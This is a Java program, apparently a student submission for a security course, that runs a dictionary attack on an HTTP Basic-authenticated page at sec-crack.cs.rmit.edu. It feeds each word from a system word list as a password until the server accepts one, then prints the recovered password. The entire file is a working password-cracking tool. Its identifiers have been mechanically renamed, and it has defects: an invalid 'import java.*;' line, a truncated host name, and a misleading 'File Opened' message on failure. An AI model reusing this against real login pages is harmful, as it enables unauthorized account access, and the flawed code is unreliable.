import java.io.*;
import java.*;
import java.net.*;
public class Dictionary {
    static BufferedReader f00 = null;
    static MyAuthenticator f10 = new MyAuthenticator();
    public static void main ( String[] v0 ) throws IOException {
        int v1;
        v1 = 0;
        String v2;
        v2 = "";
        Authenticator.setDefault ( f10 );
        try {
            URL v3;
            v3 = new URL ( "http://sec-crack.cs.rmit.edu./SEC/2/index.php" );
            for ( ; v1 != 1; ) {
                try {
                    f00 = new BufferedReader ( new InputStreamReader (
                                                   v3.openStream() ) );
                    v1 = 1;
                } catch ( IOException v4 ) {
                }
            }
            for ( ; ( v2 = f00.readLine() ) != null; ) {
            }
            System.out.println ( "The successful Password found using a Dictionary search is = " + f10.m10() );
        } catch ( MalformedURLException v5 ) {
            System.out.println ( "mfURL" );
        }
    }
}
class MyAuthenticator extends Authenticator {
    String f00 = "";
    static String f10 = "";
    static String f20 = "/usr/share/lib/dict/words";
    static BufferedReader f30;
    public MyAuthenticator() {
        try {
            f30 = new BufferedReader
            ( new FileReader ( f20 ) );
        } catch ( FileNotFoundException v6 ) {
            System.out.println ( "File " + f20 + " Not Found" );
            System.out.println ( " File Opened" );
            System.exit ( 1 );
        } catch ( IOException v7 ) {
            System.out.println ( "File  Failed.." );
            System.exit ( 1 );
        }
    }
    static void m00 ( String v8 ) {
        f10 = v8;
    }
    static String m10() {
        return f10;
    }
    static String m20() {
        try {
            if ( ( f10 = f30.readLine() ) == null ) {
                System.out.println ( "Password Not found in file '" + f20 + "'." );
                System.exit ( 1 );
            }
        } catch ( IOException v9 ) {
            System.out.println ( "File IOException" );
            System.out.println ( v9 );
        }
        return f10;
    }
    protected PasswordAuthentication getPasswordAuthentication() {
        return new PasswordAuthentication ( f00, m20().toCharArray() );
    }
}
